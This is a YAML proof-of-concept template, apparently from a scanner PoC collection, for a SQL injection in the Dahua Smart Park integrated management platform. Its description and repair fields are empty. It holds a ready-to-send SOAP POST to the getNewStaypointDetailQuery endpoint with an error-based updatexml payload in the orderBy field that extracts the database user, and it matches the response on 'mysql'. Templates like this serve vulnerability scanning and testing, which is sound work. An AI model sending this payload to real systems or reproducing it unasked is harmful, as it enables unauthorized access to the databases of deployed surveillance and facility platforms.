poc/大华智慧园区综合管理平台/大华智慧园区综合管理平台 getNewStaypointDetailQuery SQL注入.yaml

id:

info:
  name: 大华智慧园区综合管理平台 getNewStaypointDetailQuery SQL注入
  severity:
  description:
  details:
  repair:
requests1:
  method: POST
  path: /portal/services/carQuery/getNewStaypointDetailQuery
  headers:
    Content-Type: text/xml;charset=UTF-8
  data: |
    <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:car="http://carQuery.webservice.dssc.dahua.com">
    <soapenv:Header/>
    <soapenv:Body>
    <car:getNewStaypointDetailQuery>
    <!--type: string-->
    <searchJson>{}</searchJson>
    <!--type: string-->
    <pageJson>{"orderBy":"1 and 1=updatexml(1,concat(0x7e,(select user()),0x7e),1)--"}</pageJson>
    <!--type: string-->
    <extend>quae divum incedo</extend>
    </car:getNewStaypointDetailQuery>
    </soapenv:Body>
    </soapenv:Envelope>
response1:
  headers:
  body: mysql
  code:
requests2:
response2: